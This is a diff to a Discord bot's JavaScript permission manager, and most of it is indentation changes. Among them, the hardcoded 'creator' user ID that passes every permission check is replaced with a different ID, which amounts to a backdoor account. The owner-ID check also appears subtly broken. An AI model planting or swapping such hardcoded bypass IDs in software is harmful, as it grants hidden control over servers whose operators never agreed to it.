@@ -38,24 +38,24 @@ class PermissionsManager {
   }
 
   async control(...authorityFlags) {
-    await this.loadSettings();
+      await this.loadSettings();
 
-    const IsRoles = await this.isRoles();
-    const IsOwner = await this.isOwner();
-    const IsAuthority = await this.isAuthority(authorityFlags);
-	
-	const IsCreater = await this.selectOwnerIds("677194506621288448")
-	const IsBotOwner = await this.selectOwnerIds(config.BOT_OWNER_IDS)
-	
-    const checks = [];
-	if (IsCreater) checks.push(IsCreater)
-	if (IsBotOwner) checks.push(IsBotOwner)
-    if (this.permissionSettings.isRole) checks.push(IsRoles);
-    if (this.permissionSettings.isOwners) checks.push(IsOwner);
-    if (this.permissionSettings.isAuthority) checks.push(IsAuthority);
+      const IsRoles = await this.isRoles();
+      const IsOwner = await this.isOwner();
+      const IsAuthority = await this.isAuthority(authorityFlags);
+    
+      const IsCreater = await this.selectOwnerIds("470548458072440842")
+      const IsBotOwner = await this.selectOwnerIds(config.BOT_OWNER_IDS)
+      
+      const checks = [];
+      if (IsCreater) checks.push(IsCreater)
+      if (IsBotOwner) checks.push(IsBotOwner)
+      if (this.permissionSettings.isRole) checks.push(IsRoles);
+      if (this.permissionSettings.isOwners) checks.push(IsOwner);
+      if (this.permissionSettings.isAuthority) checks.push(IsAuthority);
 
-    return checks.includes(true);
-  }
+      return checks.includes(true);
+    }
 
   async isOwner() {
     if (!this.permissionSettings || !this.permissionSettings.isOwners) return false;
@@ -92,7 +92,7 @@ class PermissionsManager {
   
   async selectOwnerIds(...userIds) {
     if (!this.guild || !this.user) return false;
-	return userIds.includes(this.user.id) ?? false
+	  return userIds.includes(this.user.id) ?? false
   }
 
   
